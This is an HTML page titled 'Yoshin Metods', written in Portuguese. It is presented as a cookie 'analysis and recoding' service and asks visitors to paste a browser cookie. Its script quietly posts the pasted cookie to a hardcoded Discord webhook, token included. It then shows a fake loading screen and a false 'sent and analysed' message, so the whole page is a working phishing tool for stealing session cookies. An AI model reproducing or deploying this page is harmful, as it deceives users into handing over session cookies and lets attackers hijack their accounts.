<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Yoshin Metods</title>
<style>
    body {
        margin: 0;
        padding: 0;
        background: #000;
        font-family: Arial, sans-serif;
        overflow: hidden;
        color: white;
    }

    .waves {
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background: radial-gradient(circle at center, rgba(255,0,0,0.25), transparent 70%);
        opacity: 0.25;
        animation: waveMove 6s infinite linear;
    }

    @keyframes waveMove {
        0% { transform: scale(1); }
        50% { transform: scale(1.2); }
        100% { transform: scale(1); }
    }

    .card {
        width: 450px;
        background: rgba(20,20,20,0.9);
        padding: 25px;
        margin: 80px auto;
        border-radius: 15px;
        text-align: center;
        border: 1px solid red;
        box-shadow: 0 0 25px rgba(255,0,0,0.3);
        position: relative;
    }

    .title {
        font-size: 32px;
        font-weight: bold;
        color: #ff3b3b;
        text-shadow: 0 0 8px rgba(255,0,0,0.6);
        margin-bottom: 15px;
    }

    textarea {
        width: 90%;
        height: 120px;
        background: #111;
        border: 1px solid red;
        border-radius: 8px;
        color: white;
        padding: 10px;
        resize: none;
        outline: none;
        font-size: 16px;
    }

    button {
        margin-top: 15px;
        width: 180px;
        padding: 12px;
        background: #ff2a2a;
        border: none;
        border-radius: 8px;
        color: white;
        font-size: 18px;
        cursor: pointer;
        transition: 0.2s;
    }

    button:hover {
        background: #cc0000;
        transform: scale(1.05);
    }

    .status {
        margin-top: 12px;
        font-size: 14px;
        color: #ccc;
    }

    .overlay {
        display: none;
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        justify-content: center;
        align-items: center;
        flex-direction: column;
        color: red;
        font-size: 26px;
        text-shadow: 0 0 10px red;
    }

    .loading-bar {
        width: 260px;
        height: 18px;
        border: 1px solid red;
        margin-top: 15px;
        overflow: hidden;
        border-radius: 5px;
    }

    .loading-fill {
        width: 60%;
        height: 100%;
        background: red;
        animation: loading 10s infinite linear;
    }

    @keyframes loading {
        0% { transform: translateX(-100%); }
        100% { transform: translateX(100%); }
    }

    .warning {
        margin-top: 10px;
        font-size: 12px;
        opacity: 0.6;
        color: #bbb;
    }
</style>
</head>

<body>

<div class="waves"></div>

<div class="card">
    <div class="title">Yoshin Metods</div>

    <textarea id="txt" placeholder="Digite o cookie aqui..."></textarea><br>

    <button id="sendBtn">Enviar</button>

    <div class="warning">o cookie estar√° sendo analisada e recodificada.</div>

    <div class="status" id="status"></div>
</div>

<div class="overlay" id="overlay">
    Carregando mensagem...
    <div class="loading-bar"><div class="loading-fill"></div></div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1440881786514182154/5Wzf7C6AiyGiffC-RDZI0vvLq5RU1aU5Wi1ErDY9p8yT40V4RwZPHaDtL6QT_UxBh47M";

const sendBtn = document.getElementById("sendBtn");
const txt = document.getElementById("txt");
const statusBox = document.getElementById("status");
const overlay = document.getElementById("overlay");

function showOverlay() { overlay.style.display = "flex"; }
function hideOverlay() { overlay.style.display = "none"; }
function setStatus(msg) { statusBox.innerText = msg; }

sendBtn.addEventListener("click", async () => {
    const t = txt.value.trim();
    if (!t) {
        setStatus("Digite algo antes de enviar.");
        return;
    }

    showOverlay();

    try {
        await fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: t })
        });

        setStatus("Cookie enviado e analisado!");
        txt.value = "";
    } catch (e) {
        setStatus("Erro ao enviar.");
    }

    setTimeout(() => hideOverlay(), 1500);
});
</script>

</body>
</html>
